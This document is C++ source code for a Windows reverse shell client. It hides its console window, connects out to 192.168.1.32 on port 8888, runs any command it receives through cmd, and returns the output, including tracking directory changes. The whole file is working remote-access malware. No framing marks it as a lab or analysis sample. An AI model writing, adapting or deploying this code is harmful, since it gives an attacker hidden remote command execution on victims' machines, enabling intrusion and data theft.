#include <iostream>
#include <thread>
#include <cstring>
#include <map>
#include <memory>
#include <filesystem>

#include <winsock2.h>
#include <ws2tcpip.h>

#include <windows.h>
#pragma comment(lib, "Ws2_32.lib")

std::string currentDirectory = std::filesystem::current_path().string();

// Execute command from current directory
std::string exec(const std::string& cmd) {
    // cd /d ensures we switch drives as well (Windows behavior)
    std::string fullCmd = "cmd /C cd /d \"" + currentDirectory + "\" && " + cmd;
    std::shared_ptr<FILE> pipe(_popen(fullCmd.c_str(), "r"), _pclose);
    if (!pipe) return "ERROR\n";

    char buffer[128];
    std::string result;
    while (fgets(buffer, sizeof(buffer), pipe.get()) != NULL) {
        result += buffer;
    }
    return result;
}

// Receives and handles commands
void receive_loop(SOCKET clientfd) {
    char buffer[1024];
    while (true) {
        int bytes = recv(clientfd, buffer, sizeof(buffer) - 1, 0);
        if (bytes <= 0) {
            break;
        }
        buffer[bytes] = '\0';

        std::string command(buffer);
        std::string output;

        if (command.substr(0, 3) == "cd ") {
            std::string path = command.substr(3);
            std::filesystem::path newPath = std::filesystem::weakly_canonical(std::filesystem::path(currentDirectory) / path);
            if (std::filesystem::exists(newPath) && std::filesystem::is_directory(newPath)) {
                currentDirectory = newPath.string();
                output = "Changed directory to: " + currentDirectory + "\n";
            } else {
                output = "Directory not found: " + path + "\n";
            }
        } else {
            output = exec(command);
        }

        if (output.empty()) {
            output = "[✔] Executed successfully\n";
        }

        if (send(clientfd, output.c_str(), output.length(), 0) < 0) {
            std::cerr << "Failed to send command output\n";
            break;
        }
    }
}

int main() {
    // hide console 
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    // Initialize Winsock
    WSADATA wsaData;
    int wsaerr = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (wsaerr != 0) {
        std::cerr << "WSAStartup failed with error: " << wsaerr << "\n";
        return -1;
    }

    SOCKET clientfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientfd == INVALID_SOCKET) {
        std::cerr << "Socket creation failed\n";
        WSACleanup();
        return -1;
    }

    sockaddr_in serverAddress{};
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(8888);

    if (inet_pton(AF_INET, "192.168.1.32", &serverAddress.sin_addr) <= 0) {
        std::cerr << "Invalid address\n";
        closesocket(clientfd);
        WSACleanup();
        return -1;
    }

    if (connect(clientfd, (sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {
        std::cerr << "Connection failed\n";
        closesocket(clientfd);
        WSACleanup();
        return -1;
    }

    std::cout << "[+] Connected to server\n";
    receive_loop(clientfd);

    closesocket(clientfd);
    WSACleanup();
    return 0;
}
